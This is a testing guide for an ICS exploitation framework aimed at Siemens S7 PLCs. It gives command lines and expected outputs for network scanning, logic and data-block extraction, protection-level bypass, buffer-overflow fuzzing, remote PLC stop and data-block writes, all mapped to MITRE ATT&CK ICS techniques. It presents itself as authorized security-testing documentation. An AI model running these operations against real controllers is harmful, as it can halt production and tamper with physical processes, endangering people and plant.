# S7Comm Security Framework - Testing Guide

## Overview

Comprehensive testing guide for the S7Comm/S7CommPlus Protocol Exploitation Framework v4.0.

**CRITICAL**: All testing must be performed in authorized environments only.

## Prerequisites

### Required Software

```bash
pip install python-snap7
pip install argcomplete
```

### Snap7 Library Installation

**Linux:**
```bash
wget https://sourceforge.net/projects/snap7/files/1.4.2/snap7-full-1.4.2.tar.gz
tar xzf snap7-full-1.4.2.tar.gz
cd snap7-full-1.4.2/build/unix
make -f x86_64_linux.mk
sudo cp ../bin/x86_64-linux/libsnap7.so /usr/lib/
sudo ldconfig
```

**Windows:**
```powershell
# Download snap7-full-1.4.2.zip from SourceForge
# Extract and copy snap7.dll to C:\Windows\System32\
```

### Test Environment Setup

**Option 1: Snap7 Server (Recommended for Testing)**

```python
# test_server.py
import snap7.server as s7server
import time

server = s7server.Server()
server.create()

# Allocate memory areas
server.register_area(s7server.srvAreaDB, 1, bytearray(1024))
server.register_area(s7server.srvAreaDB, 2, bytearray(512))

server.start()
print("Snap7 test server running on port 102")
print("Press Ctrl+C to stop")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    server.stop()
    server.destroy()
```

**Option 2: PLCSIM (Siemens Simulator)**
- Install TIA Portal with PLCSIM
- Create test project with sample DBs
- Start PLCSIM instance

## Test Cases

### 1. Basic Connectivity Test

```bash
python s7comm_exploit.py info 192.168.1.100
```

**Expected Output:**
```
PLC Security Assessment:
  module_type: CPU 315-2 PN/DP
  serial_number: S C-X4U304304012
  version: V3.3.16
  security_assessment: {'risk_level': 'MEDIUM'}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:186-221`

### 2. Network Scanning

```bash
python s7comm_exploit.py scan 192.168.1.0/24
```

**Expected Output:**
```
Scan Results for 192.168.1.0/24:
Responsive S7Comm devices: 3
  - 192.168.1.100:102
  - 192.168.1.101:102
  - 192.168.1.102:102
Security Assessment: HIGH
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:682-739`

### 3. Data Block Reading

```bash
python s7comm_exploit.py read-db 192.168.1.100 1 0 100
```

**Expected Output:**
```
Operation Results:
  success: True
  data_hex: 000000000000...
  data_length: 100
  db_number: 1
  offset: 0
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:443-468`

### 4. Block Upload

```bash
python s7comm_exploit.py upload 192.168.1.100 0x0A 1 /tmp/DB1.bin
```

**Expected Output:**
```
Operation Results:
  success: True
  bytes_written: 1024
  file_path: /tmp/DB1.bin
  security_implication: Logic extraction successful
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:411-441`

### 5. Symbol Table Extraction

```bash
python s7comm_exploit.py extract-symbols 192.168.1.100
```

**Expected Output:**
```json
{
  "success": true,
  "symbol_count": 5,
  "symbols": [
    {
      "name": "DB1",
      "area": "DB",
      "db_number": 1,
      "address": "DB1.DBX0.0",
      "data_type": "DB",
      "length": 1024,
      "comment": "Data Block 1"
    }
  ]
}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:654-722`

### 6. Mass Data Block Export

```bash
python s7comm_exploit.py export-all-dbs 192.168.1.100 ./export_output
```

**Expected Output:**
```
Operation Results:
  success: True
  exported_blocks: [
    {'db_number': 1, 'file': './export_output/DB1.bin', 'size': 1024},
    {'db_number': 2, 'file': './export_output/DB2.bin', 'size': 512}
  ]
  total_bytes: 1536
  export_directory: ./export_output
```

**Files Created:**
- `export_output/DB1.bin` - Binary data
- `export_output/DB1.json` - Metadata with SHA256, author, version, etc.

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:724-823`

### 7. Protection Level Bypass Testing

```bash
python s7comm_exploit.py test-protection 192.168.1.100
```

**Expected Output:**
```json
{
  "success": true,
  "protection_level": 1,
  "bypass_attempts": [
    {
      "method": "PG Connection (0x01)",
      "result": "SUCCESS",
      "note": "Basic read succeeded"
    },
    {
      "method": "OP Connection (0x02)",
      "result": "SUCCESS",
      "note": "Operator connection read succeeded"
    }
  ]
}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:825-919`

### 8. S7CommPlus Protocol Detection

```bash
python s7comm_exploit.py s7plus-probe 192.168.1.100
```

**Expected Output:**
```json
{
  "success": true,
  "s7commplus_detected": true,
  "response_hex": "0300001b11e00000010072010000..."
}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:921-980`

### 9. Buffer Overflow Vulnerability Testing

```bash
python s7comm_exploit.py buffer-overflow 192.168.1.100
```

**Expected Output:**
```json
{
  "target": "192.168.1.100:102",
  "tests_performed": 6,
  "vulnerabilities_found": [],
  "responses": [
    {
      "packet_id": 0,
      "response_length": 22,
      "response_hex": "0300001611e00000..."
    }
  ]
}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:223-316`

### 10. Comprehensive Reconnaissance

```bash
python s7comm_exploit.py recon 192.168.1.100
```

**Expected Output:**
```json
{
  "plc_info": {
    "module_type": "CPU 315-2 PN/DP",
    "serial_number": "S C-X4U304304012",
    "fingerprint": "S7-300 series",
    "security_assessment": {"risk_level": "MEDIUM"}
  },
  "blocks": {
    "blocks_found": {
      "OB": {"count": 3, "blocks": [1, 100, 122]},
      "DB": {"count": 5, "blocks": [1, 2, 3, 4, 5]}
    },
    "security_analysis": {
      "total_blocks": 8,
      "risk_assessment": "MEDIUM"
    }
  },
  "security_assessment": {
    "risk_score": 15,
    "risk_level": "MEDIUM"
  }
}
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:586-634`

### 11. PLC Control Operations

**WARNING: CRITICAL OPERATION - PRODUCTION IMPACT**

```bash
# Stop PLC
python s7comm_exploit.py control 192.168.1.100 stop

# Start PLC
python s7comm_exploit.py control 192.168.1.100 start
```

**Expected Output (Stop):**
```
Operation Results:
  success: True
  impact: PRODUCTION_HALT
  risk_level: CRITICAL
  security_warning: PLC STOP command executed - Production impacted
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:496-536`

### 12. Data Block Write

**WARNING: HIGH RISK OPERATION**

```bash
python s7comm_exploit.py write-db 192.168.1.100 1 0 "DEADBEEF"
```

**Expected Output:**
```
Operation Results:
  success: True
  bytes_written: 4
  security_warning: Control logic modification performed
  risk_level: HIGH
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:470-494`

## Packet Structure Validation Tests

### Test S7Packet Class

```python
from s7comm_exploit import S7Packet, S7ProtocolID

# Test packet creation and serialization
packet = S7Packet(
    protocol_id=S7ProtocolID.S7COMM,
    message_type=0x01,
    parameter_length=4,
    data_length=0,
    parameters=b'\x00\x00\x00\x00'
)

# Validate structure
valid, msg = packet.validate()
assert valid, f"Packet validation failed: {msg}"

# Test serialization
packet_bytes = packet.to_bytes()
assert len(packet_bytes) == 27  # TPKT(4) + COTP(3) + S7Comm(10) + params(4) + data(0)

# Test deserialization
parsed = S7Packet.from_bytes(packet_bytes)
assert parsed.protocol_id == S7ProtocolID.S7COMM
assert parsed.parameter_length == 4

print("✓ Packet structure validation passed")
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:93-195`

### Test S7CommPlus Detection

```python
from s7comm_exploit import S7ProtocolID

s7plus_packet = S7Packet(
    protocol_id=S7ProtocolID.S7COMM_PLUS,
    message_type=0x01,
    parameter_length=4,
    data_length=0,
    parameters=b'\x00\x00\x00\x00'
)

valid, msg = s7plus_packet.validate()
assert valid, "S7CommPlus packet validation failed"
assert s7plus_packet.protocol_id == 0x72

print("✓ S7CommPlus packet structure validated")
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:46-49`

## Error Handling Tests

### Test Connection Failures

```bash
# Test invalid IP
python s7comm_exploit.py info 192.168.999.999
# Expected: IP validation error

# Test unreachable host
python s7comm_exploit.py info 192.168.1.254
# Expected: Connection timeout with proper error handling

# Test invalid block number
python s7comm_exploit.py upload 192.168.1.100 0x0A 9999 /tmp/test.bin
# Expected: Graceful error with descriptive message
```

### Test Invalid Data Formats

```bash
# Test invalid hex data
python s7comm_exploit.py write-db 192.168.1.100 1 0 "GGGGGGGG"
# Expected: Hex parsing error with helpful message

# Test odd-length hex
python s7comm_exploit.py write-db 192.168.1.100 1 0 "AAA"
# Expected: "Hex string must have even number of characters" error
```

**Reference:** `tools/s7comm_security_framework/s7comm_exploit.py:1040-1071`

## PCAP Validation

### Capture S7Comm Traffic

```bash
# Start tcpdump
sudo tcpdump -i eth0 -w s7comm_test.pcap port 102

# Execute command in another terminal
python s7comm_exploit.py read-db 192.168.1.100 1 0 10

# Stop tcpdump (Ctrl+C)
```

### Analyze with Wireshark

```bash
wireshark s7comm_test.pcap
```

**Validation Checklist:**
- [ ] TPKT version = 3 (0x03)
- [ ] S7Comm protocol ID = 0x32 (or 0x72 for S7CommPlus)
- [ ] Proper parameter and data length fields
- [ ] Valid function codes (0x04 for read, 0x05 for write)
- [ ] Correct CRC/checksums
- [ ] No malformed packets

**Reference:** Packet structure defined in `tools/s7comm_security_framework/s7comm_exploit.py:93-195`

## MITRE ATT&CK Validation

### Verify Technique Mappings

| Command | Expected MITRE Techniques |
|---------|--------------------------|
| scan | T0801 - Network Service Scanning |
| info | T0802 - Determine Firmware Version |
| upload | T0803 - Program Download |
| read-db | T0805 - Program Upload |
| write-db | T0823 - Modify Control Logic |
| control (stop) | T0825 - Denial of Control |
| extract-symbols | T0861 - Point & Tag Identification |
| export-all-dbs | T0868 - Detect Program State |
| buffer-overflow | T0814, T0833 - Unauthorized Command, Exploitation for DoS |
| test-protection | T0818, T0849 - Engineering Workstation Compromise, Masquerading |

**Verification:** Check log output for correct MITRE ATT&CK technique logging.

## Performance Benchmarks

### Scan Performance

```bash
time python s7comm_exploit.py scan 192.168.1.0/24 --max-workers 50
```

**Expected:**
- /24 subnet scan: < 30 seconds
- /16 subnet scan: < 10 minutes (with proper worker tuning)

### Export Performance

```bash
time python s7comm_exploit.py export-all-dbs 192.168.1.100 /tmp/export
```

**Expected:**
- 10 DBs (total 10KB): < 5 seconds
- 100 DBs (total 100KB): < 30 seconds

## Security Testing Best Practices

1. **Always use isolated test environments**
2. **Document all testing activities**
3. **Obtain proper authorization before testing**
4. **Use rate limiting to avoid DoS**
5. **Verify packet structures with PCAP analysis**
6. **Test error handling with invalid inputs**
7. **Validate MITRE ATT&CK mappings**
8. **Monitor system logs for anomalies**

## Troubleshooting

### Common Issues

**Issue:** `snap7.snap7exceptions.Snap7Exception: CLI Error(-2)`
**Solution:** Check network connectivity, firewall rules, PLC IP address

**Issue:** `ModuleNotFoundError: No module named 'snap7'`
**Solution:** `pip install python-snap7` and install Snap7 library

**Issue:** "Connection timeout"
**Solution:** Verify PLC is running, port 102 is open, no firewall blocking

**Issue:** "Protection violation"
**Solution:** Use `test-protection` command to identify accessible connection types

**Issue:** Block upload fails
**Solution:** Check block exists with `recon` command first

## Integration Testing

### Full Workflow Test

```bash
#!/bin/bash
TARGET="192.168.1.100"

echo "=== S7Comm Security Framework Integration Test ==="

echo "[1/7] Testing connectivity..."
python s7comm_exploit.py info $TARGET || exit 1

echo "[2/7] Running reconnaissance..."
python s7comm_exploit.py recon $TARGET --output-format json > recon.json || exit 1

echo "[3/7] Extracting symbols..."
python s7comm_exploit.py extract-symbols $TARGET --output-format json > symbols.json || exit 1

echo "[4/7] Testing S7CommPlus..."
python s7comm_exploit.py s7plus-probe $TARGET --output-format json > s7plus.json || exit 1

echo "[5/7] Testing protection bypass..."
python s7comm_exploit.py test-protection $TARGET --output-format json > protection.json || exit 1

echo "[6/7] Exporting data blocks..."
python s7comm_exploit.py export-all-dbs $TARGET ./test_export || exit 1

echo "[7/7] Reading sample data..."
python s7comm_exploit.py read-db $TARGET 1 0 100 || exit 1

echo "=== All tests passed ==="
```

## Version Information

**Framework Version:** 4.0
**Snap7 Version:** 1.4.2
**Python Version:** 3.8+

## References

- Snap7 Documentation: http://snap7.sourceforge.net/
- S7Comm Protocol Specification: Siemens Technical Documentation
- MITRE ATT&CK ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/s7comm_security_framework/s7comm_exploit.py`
